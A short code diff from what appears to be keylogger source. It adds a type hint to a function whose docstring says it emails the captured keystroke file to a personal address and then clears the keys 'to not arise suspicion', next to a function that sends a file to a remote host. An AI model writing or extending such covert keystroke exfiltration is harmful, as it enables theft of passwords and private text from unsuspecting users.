@@ -151,7 +151,7 @@ def sendFile(host: str, port: int, filepath: str) -> None:
     except Exception:
             return
 
-def clear(filepath: str):
+def clear(filepath: str) -> None:
     """
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
